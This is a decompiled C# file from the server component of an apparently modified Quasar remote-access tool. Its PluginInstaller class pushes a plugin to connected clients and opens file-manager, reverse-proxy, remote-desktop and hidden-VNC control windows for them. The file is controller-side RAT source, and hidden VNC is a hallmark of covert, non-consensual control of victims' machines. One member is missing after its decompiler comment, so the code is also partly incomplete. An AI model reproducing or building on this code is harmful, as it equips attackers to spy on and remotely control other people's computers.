using System;
using System.Collections.Generic;
using System.Linq;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Server.Forms;
using Quasar.Server.Messages;
using Quasar.Server.Networking;

namespace Quasar.Server.Helper
{
    // Token: 0x0200002E RID: 46
    public class PluginInstaller
    {
        // Token: 0x060002B3 RID: 691 RVA: 0x0000986C File Offset: 0x00007A6C
        public PluginInstaller(Client[] clients)
        {
            this._clients = clients;
            this.count = clients.Length;
            this._remoteExecutionMessageHandlers = new List<PluginInstaller.RemoteExecutionMessageHandler>();
            PluginInstaller.RemoteExecutionMessageHandler remoteExecutionMessageHandler = new PluginInstaller.RemoteExecutionMessageHandler
            {
                FileHandler = new PluginHandler()
            };
            this._remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
            this.RegisterMessageHandler(remoteExecutionMessageHandler);
        }

        // Token: 0x060002B4 RID: 692 RVA: 0x000098C9 File Offset: 0x00007AC9
        private void RegisterMessageHandler(PluginInstaller.RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            remoteExecutionMessageHandler.FileHandler.StatusUpdated += this.OnStatusUpdated;
            MessageHandler.Register(remoteExecutionMessageHandler.FileHandler);
        }

        // Token: 0x060002B5 RID: 693 RVA: 0x000098ED File Offset: 0x00007AED
        private void UnregisterMessageHandler(PluginInstaller.RemoteExecutionMessageHandler remoteExecutionMessageHandler)
        {
            MessageHandler.Unregister(remoteExecutionMessageHandler.FileHandler);
            remoteExecutionMessageHandler.FileHandler.StatusUpdated -= this.OnStatusUpdated;
        }

        // Token: 0x060002B6 RID: 694 RVA: 0x00009914 File Offset: 0x00007B14
        public void Closing()
        {
            foreach (PluginInstaller.RemoteExecutionMessageHandler remoteExecutionMessageHandler in this._remoteExecutionMessageHandlers)
            {
                this.UnregisterMessageHandler(remoteExecutionMessageHandler);
            }
            this._remoteExecutionMessageHandlers.Clear();
        }

        // Token: 0x060002B7 RID: 695 RVA: 0x00009974 File Offset: 0x00007B74
        public void PluginSent(IMessage message)
        {
            foreach (Client client in this._clients)
            {
                client.ClientState += this.OnStatusClient;
                client.Send<IMessage>(message);
            }
        }

        // Token: 0x060002B8 RID: 696 RVA: 0x000099B1 File Offset: 0x00007BB1
        private void OnStatusClient(Client client, bool statusMessage)
        {
            if (!statusMessage)
            {
                this.OnStatusUpdated(new object(), client, statusMessage.ToString(), false);
            }
        }

        // Token: 0x060002B9 RID: 697 RVA: 0x000099CC File Offset: 0x00007BCC
        private void OnStatusUpdated(object sender, Client client, string statusMessage, bool fromHandler)
        {
            this.count--;
            if (!(statusMessage == "FrmFileManager"))
            {
                if (!(statusMessage == "FrmReverseProxy"))
                {
                    if (statusMessage == "FrmHvnc")
                    {
                        if (this.count >= 0 && fromHandler)
                        {
                            this._clients.Any((Client p) => this.identifyClient(p, client, p.PEquals(client)));
                        }
                        FrmHvnc frmHvnc = FrmHvnc.CreateNewOrGetExisting(client);
                        frmHvnc.Show();
                        frmHvnc.Focus();
                        this.Closing();
                        return;
                    }
                    if (!(statusMessage == "FrmRemoteDesktop"))
                    {
                        return;
                    }
                    if (this.count >= 0 && fromHandler)
                    {
                        this._clients.Any((Client p) => this.identifyClient(p, client, p.PEquals(client)));
                    }
                    FrmRemoteDesktop frmRemoteDesktop = FrmRemoteDesktop.CreateNewOrGetExisting(client);
                    frmRemoteDesktop.Show();
                    frmRemoteDesktop.Focus();
                    this.Closing();
                }
                else
                {
                    if (this.count >= 0 && fromHandler)
                    {
                        this._clients.Any((Client p) => this.identifyClient(p, client, p.PEquals(client)));
                    }
                    if (this.count == 0)
                    {
                        FrmReverseProxy frmReverseProxy = new FrmReverseProxy(this.Rclients.ToArray());
                        frmReverseProxy.Show();
                        frmReverseProxy.Focus();
                        this.Closing();
                        return;
                    }
                }
                return;
            }
            if (this.count >= 0 && fromHandler)
            {
                this._clients.Any((Client p) => this.identifyClient(p, client, p.PEquals(client)));
            }
            FrmFileManager frmFileManager = FrmFileManager.CreateNewOrGetExisting(client);
            frmFileManager.Show();
            frmFileManager.Focus();
            this.Closing();
        }

        // Token: 0x060002BA RID: 698 RVA: 0x00009B61 File Offset: 0x00007D61
        private bool identifyClient(Client p, Client c, bool match)
        {
            if (match && !this.Rclients.Contains(c))
            {
                c.Value = p.Value;
                this.Rclients.Add(c);
                return true;
            }
            return false;
        }

        // Token: 0x060002BB RID: 699 RVA: 0x00009B8F File Offset: 0x00007D8F

        // Token: 0x040000F1 RID: 241
        private readonly Client[] _clients;

        // Token: 0x040000F2 RID: 242
        internal int count;

        // Token: 0x040000F3 RID: 243
        private List<Client> Rclients = new List<Client>();

        // Token: 0x040000F4 RID: 244
        private readonly List<PluginInstaller.RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;

        // Token: 0x040000F5 RID: 245
        private bool _isUpdate;

        // Token: 0x020000A2 RID: 162
        private class RemoteExecutionMessageHandler
        {
            // Token: 0x040003E9 RID: 1001
            public PluginHandler FileHandler;
        }

        // Token: 0x020000A3 RID: 163
        private enum TransferColumn
        {
            // Token: 0x040003EB RID: 1003
            Client,
            // Token: 0x040003EC RID: 1004
            Status
        }
    }
}
